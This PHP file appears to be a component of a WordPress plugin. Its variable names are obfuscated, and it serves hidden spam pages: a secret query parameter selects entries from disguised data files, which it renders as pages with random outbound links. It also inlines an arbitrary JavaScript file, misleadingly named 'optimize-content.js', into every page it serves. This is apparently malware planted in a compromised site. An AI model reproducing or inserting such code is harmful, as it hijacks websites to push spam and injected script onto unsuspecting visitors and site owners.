<?php
$hDMXMrDE = intval(get_query_var('suqzfyyhvi'));

if ($hDMXMrDE < 1 || $hDMXMrDE > 2508) return;
$sd1iG = file(plugin_dir_path(__FILE__).'conditional-limit.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$n8YBCe = explode(';', $sd1iG[$hDMXMrDE]);
if (count($n8YBCe) < 2) return;
$p1UcSxGsE = $n8YBCe[0];
$nOzej1QWn  = $n8YBCe[1];
$mGAcMa = $n8YBCe[2];
$aOAFLWyd  = $n8YBCe[3];
$rPuAKF = $n8YBCe[4];
set_query_var('jykkzrcrry', $p1UcSxGsE);

$liNsWY = '';
$hipTuWqy2O = plugin_dir_path(__FILE__).'tracking-platform.php';
if (is_file($hipTuWqy2O)) {
	$sYI1Axz = file($hipTuWqy2O, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($sYI1Axz);
	shuffle($sYI1Axz);
	$mlyNQ19lu5 = mt_rand(2, 5);
	if (count($sYI1Axz) > $mlyNQ19lu5) {
		for ($kJux82LM8 = 0; $kJux82LM8 < $mlyNQ19lu5; $kJux82LM8++) {
			$sbEM7 = array_shift($sYI1Axz);
			$liNsWY .= '<p><a href="'.$sbEM7.'">'.$sbEM7.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $p1UcSxGsE; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $nOzej1QWn . "</p>\n";
				if (strlen($aOAFLWyd) > 0) echo "<p>" . $aOAFLWyd . "</p>\n";
				if (strlen($mGAcMa) > 0) echo "<p>" . $mGAcMa . "</p>\n";
				if (strlen($rPuAKF) > 0) echo '<p><a href="#"><img src="'.$rPuAKF.'"></a>' . "</p>\n";
				echo $liNsWY;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$uhPIzlOiLC = plugin_dir_path(__FILE__) . 'optimize-content.js';
if (is_file($uhPIzlOiLC)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($uhPIzlOiLC);
	echo '</script>';
}
get_footer();
?>
